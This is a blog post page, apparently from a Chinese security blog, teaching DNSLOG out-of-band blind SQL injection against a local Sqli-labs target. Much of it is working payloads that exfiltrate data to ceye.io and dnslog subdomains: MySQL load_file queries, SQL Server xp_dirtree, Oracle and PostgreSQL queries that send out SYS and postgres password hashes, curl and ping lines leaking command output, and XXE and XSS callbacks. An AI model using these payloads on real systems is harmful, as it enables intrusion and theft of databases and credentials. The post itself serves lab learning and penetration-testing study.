@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="有时候盲注太浪费时间了，但是我们可以将盲注变为显错注入呢?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNSLOG快速盲注">
+<meta property="og:url" content="http://atsud0.me/2020/07/22/DNSLOG%E5%BF%AB%E9%80%9F%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="有时候盲注太浪费时间了，但是我们可以将盲注变为显错注入呢?">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200719_200129.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200719_203440.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200722_193659.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200722_194012.jpg">
+<meta property="article:published_time" content="2020-07-22T11:51:04.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.455Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="sql_injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200719_200129.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/07/22/DNSLOG%E5%BF%AB%E9%80%9F%E7%9B%B2%E6%B3%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DNSLOG快速盲注 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/07/22/DNSLOG%E5%BF%AB%E9%80%9F%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DNSLOG快速盲注
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-07-22 19:51:04" itemprop="dateCreated datePublished" datetime="2020-07-22T19:51:04+08:00">2020-07-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>有时候盲注太浪费时间了，但是我们可以将盲注变为显错注入呢?</p>
+<a id="more"></a>
+
+<h2 id="0x01-部署环境"><a href="#0x01-部署环境" class="headerlink" title="0x01 部署环境"></a>0x01 部署环境</h2><ul>
+<li>Web服务器(PHPStudy+Sqli靶场)</li>
+<li>随便一台服务器</li>
+</ul>
+<blockquote>
+<p>如果是自己搭建DNSLOG的话，则多需要一台VPS，还有需要一个域名。</p>
+</blockquote>
+<p>使用要求</p>
+<ul>
+<li>能够使用load_file函数。</li>
+<li>Windows服务器</li>
+<li>allow_url_fopen (默认开启)</li>
+</ul>
+<p>secure_file_priv似乎能为NULL?在mysql 5.4.5中测试即使是NULL也使用dnslog注入。所以使用条件应该是能够利用load_file函数?</p>
+<h2 id="0x02-原理说明"><a href="#0x02-原理说明" class="headerlink" title="0x02 原理说明"></a>0x02 原理说明</h2><p>UNC路径(Universal Naming Convention)通用命名规则。</p>
+<blockquote>
+<p>通用命名规则UNC (Universal Naming Convention) ，也叫通用命名规范、通用命名约定，指用一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置。(百度解释)<br>Windows的UNC路径格式为:<code>\\servername\sharename</code>，平时也会用到这个来访问一些共享服务。linux主机不存在这个规范，所以Linux服务器无法实现这个mysql-dnslog快速盲注。</p>
+</blockquote>
+<p>所以Mysql的dnslog注入的原理就是:<strong>攻击者利用windows unc路径使数据库将注入语句的结果带出到dns服务器中。</strong>（个人理解）</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200719_200129.jpg" alt=""></p>
+<h2 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h2><p>核心语句:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#39;\\\\&#39;,hex((select database())),&#39;.pycd4.l.dnslog.io\\abv&#39;));</span><br><span class="line">&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 4,1),&#39;.XXX.ceye.io\\abc&#39;))),1,1) --+</span><br><span class="line">&#39; and load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.XXX.ceye.io\\abc&#39;)) --+</span><br><span class="line">&#39; and load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.XXX.dnslog.link\\abc&#39;)) --+</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>\\\\</code>四个斜杠的意思其实是<code>\\</code>。因为在mysql中不会存储有功能意义的反斜杠，所以要转义<code>\\</code>，这就是为什么会有<code>\\\\</code>的原因。</p>
+<p>Windows访问<code>\\pycd4.l.dnslog.io\abc</code>(改成你自己的域名)</p>
+<p>如果成功的话，dnslong中则会出现。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200719_203440.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.145&#x2F;sql&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit 4,1),&#39;.lwy2.l.dnslog.io\\abv&#39;))),1,0) And &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>成功将数据库名字外带出来<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_193659.jpg" alt=""></p>
+<p>直接查表名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.145&#x2F;sql&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.lwy2.l.dnslog.io\\abc&#39;)) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_194012.jpg" alt=""></p>
+<h2 id="0x04-Payload"><a href="#0x04-Payload" class="headerlink" title="0x04 Payload"></a>0x04 Payload</h2><p>除了能利用在mysql注入中，我感觉能用在一切能对dns服务器进行请求，并且无回显的地方。<br>以下payload均来自<a href="https://silic.top/2019/10/26/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C/#mysql" target="_blank" rel="noopener">DNSlog注入利用手册</a></p>
+<h3 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);SELECT @host&#x3D;CONVERT(varchar(1024),db_name())+&#39;.8dmer4.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;;DECLARE @host varchar(1024);SELECT @host&#x3D;CONVERT(varchar(1024),db_name())+&#39;.8dmer4.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;)--</span><br></pre></td></tr></table></figure>
+
+<h3 id="Orcale"><a href="#Orcale" class="headerlink" title="Orcale"></a>Orcale</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&#39;ip.port.b182oj.ceye.io&#39;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&#39;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;oracle&#39;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&#39;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;oracle&#39;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&#39;oracle.ip.port.b182oj.ceye.io&#39;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name&#x3D;&#39;SYS&#39;)||&#39;.ip.port.b182oj.ceye.io&#39;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename&#x3D;&#39;postgres&#39;);</span><br><span class="line">exec_cmd :&#x3D; E&#39;COPY table_output(content)</span><br><span class="line">FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&#39;&#39;;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行-Linux"><a href="#命令执行-Linux" class="headerlink" title="命令执行-Linux"></a>命令执行-Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">ping -c 1 &#96;whoami&#96;.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行-Windows"><a href="#命令执行-Windows" class="headerlink" title="命令执行-Windows"></a>命令执行-Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还有其他的payload，请去原文查看~</p>
+<h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul>
+<li><a href="https://www.freebuf.com/articles/web/184587.html" target="_blank" rel="noopener">使用DNSLOG拯救你的盲打盲注 </a></li>
+<li><a href="https://github.com/bugscanteam/dnslog/" target="_blank" rel="noopener">DNSLog</a></li>
+<li><a href="http://ceye.io" target="_blank" rel="noopener">ceye-DNSLOG</a></li>
+<li><a href="https://silic.top/2019/10/26/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C/#mysql" target="_blank" rel="noopener">DNSlog注入利用手册</a></li>
+<li><a href="https://www.freebuf.com/sectool/222967.html" target="_blank" rel="noopener">手把手带你利用SQLmap结合OOB技术实现音速盲注</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/07/22/DNSLOG%E5%BF%AB%E9%80%9F%E7%9B%B2%E6%B3%A8/" title="DNSLOG快速盲注">http://atsud0.me/2020/07/22/DNSLOG快速盲注/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql_injection</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/22/Vulnhub-Tempale-of-Doom/" rel="prev" title="Vulnhub-Tempale-of-Doom">
+      <i class="fa fa-chevron-left"></i> Vulnhub-Tempale-of-Doom
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/08/29/Vulnhub-pinkys-palace-1/" rel="next" title="Vulnhub-pinkys-palace-1">
+      Vulnhub-pinkys-palace-1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-部署环境"><span class="nav-number">1.</span> <span class="nav-text">0x01 部署环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-原理说明"><span class="nav-number">2.</span> <span class="nav-text">0x02 原理说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-利用"><span class="nav-number">3.</span> <span class="nav-text">0x03 利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Payload"><span class="nav-number">4.</span> <span class="nav-text">0x04 Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLServer"><span class="nav-number">4.1.</span> <span class="nav-text">SQLServer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Orcale"><span class="nav-number">4.2.</span> <span class="nav-text">Orcale</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PostgreSQL"><span class="nav-number">4.3.</span> <span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行-Linux"><span class="nav-number">4.4.</span> <span class="nav-text">命令执行-Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行-Windows"><span class="nav-number">4.5.</span> <span class="nav-text">命令执行-Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">4.6.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">4.7.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE"><span class="nav-number">4.8.</span> <span class="nav-text">XXE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考文章"><span class="nav-number">5.</span> <span class="nav-text">0x05 参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
